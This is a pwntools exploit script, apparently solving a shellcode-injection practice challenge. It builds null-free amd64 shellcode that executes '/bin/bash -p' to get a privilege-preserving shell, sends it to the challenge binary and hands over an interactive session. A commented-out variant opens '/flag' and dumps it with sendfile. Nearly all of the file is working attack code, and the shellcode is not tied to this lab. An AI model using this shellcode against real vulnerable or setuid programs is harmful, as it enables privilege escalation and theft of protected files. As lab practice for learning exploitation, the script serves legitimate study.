from pwn import *

DEBUG = False

bin_path = '/challenge/babyshell_level3'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path])

# Shell
shellcode = shellcraft.amd64.pushstr('/bin/bash')
shellcode += 'mov rdi, rsp\n'
shellcode += shellcraft.amd64.pushstr('-p')
shellcode += 'mov rsi, rsp\n'
shellcode += shellcraft.amd64.push(0)
shellcode += '''
push rsi
push rdi
mov rsi, rsp
xor rdx, rdx
'''
shellcode += shellcraft.amd64.mov('rax', 'SYS_execve')
shellcode += 'syscall'

assert b'\x00' not in asm(shellcode)
# For read
# shellcode = f'''
# mov rax, 0x{b'/flag'[::-1].hex()}
# push rax
# mov rdi, rsp  # /flag
# mov rsi, 0  # O_RDONLY
# mov rax, SYS_open
# syscall

# mov rdi, 1
# mov rsi, rax
# mov rdx, 0
# mov r10, 1000
# mov rax, SYS_sendfile
# syscall

# mov rax, SYS_exit
# syscall
# '''

p.send(asm(shellcode))
print(p.interactive())
